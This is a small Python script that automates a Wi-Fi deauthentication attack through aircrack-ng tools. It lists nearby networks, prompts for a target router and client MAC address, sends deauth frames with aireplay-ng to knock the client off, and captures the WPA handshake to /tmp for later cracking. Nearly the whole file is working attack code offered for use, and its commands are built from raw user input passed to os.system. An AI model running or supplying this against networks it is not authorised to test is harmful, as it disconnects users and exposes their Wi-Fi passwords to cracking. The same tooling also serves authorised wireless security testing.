import os

def deauth():
    os.system("ifconfig")
    name = input("Enter your WIFI card name: ")
    os.system("airodump-ng"+" "+name)
    router = input("Enter the MAC address of the router you want to attack (BSSID):")
    channel = input("Enter the channel of the router (CH):")
    os.system("airodump-ng" + " " + "--bssid" + " " + router + " " + "--channel" + " " + channel + " " + name)
    station=input("Enter the target MAC Address( STATION ): ")
    print("\n")
    print("Now the WPA Handshake will appear on the top of the programm. Go to /tmp/ to see the results.")
    message=input("You will need to check the .pcap file. PRESS ENTER TO CONTINUE. ")
    step_2 = os.system("aireplay-ng --deauth 12 -a"+" "+router+" "+"-c"+" "+station+" "+name)
    step_1 = os.system("airodump-ng --bssid"+" "+router+" "+" --channel"+" "+channel+" --write /tmp/wpa_handsha"+" "+ name)
    while True:
        restart=input("Do you want to restart category? (y/n)")
        if restart == "y" or restart == "n":
            break
        else:
            continue
    if restart == "y":
        deauth()
    elif restart == "n":
        os.system("python3 /opt/programma/easypt.py")
    return


deauth()
